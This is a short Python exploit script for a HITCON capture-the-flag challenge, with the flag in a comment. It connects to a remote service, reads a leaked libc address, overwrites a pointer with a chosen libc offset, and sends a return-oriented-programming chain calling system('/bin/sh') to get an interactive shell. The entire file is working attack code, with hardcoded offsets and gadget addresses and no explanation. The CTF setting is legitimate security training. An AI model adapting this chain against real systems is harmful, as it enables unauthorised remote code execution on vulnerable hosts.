from pwnlib import *
import random

# hitcon{make_one_gadget_great_again!}



func_addrs = []
for line in open("funcs"):
	addr = int(line.split()[2], 16)
	func_addrs.append(addr)



#s = Socket(("localhost", 1610))
s = Socket(("13.113.242.0", 31337))

addr = int(s.ru("\n"), 16)
libc_base = addr - 0x203f1
assert (libc_base & 0xfff) == 0



# offsets = [0x4557a, 0xcde41, 0xce0e1, 0xf1651, 0xf24cb]
# offset = offsets[random.randint(0, len(offsets)-1)]
# offset += random.randint(-200, 0)
# 
# print "offset: 0x%x" % offset
# 
# gadget = libc_base + offset
# 
# payload  = pq(gadget)
# payload += pq(gadget)


offset = func_addrs[random.randint(0, len(func_addrs)-1)]

offset = 0x1071e0


print "offset: 0x%x" % offset

payload  = pq(libc_base + offset  )
payload += pq(libc_base + 0x6FFF0)

s.send(payload)


system = libc_base + 0x456A0
pop_rdi = libc_base + 0x000D6AA3     +9
bin_sh = libc_base + 0x18AC40

payload = ""
payload += "A"*16
payload += pq(pop_rdi)
payload += pq(bin_sh)
payload += pq(system)


raw_input("> ")
s.send(payload)


s.interact()

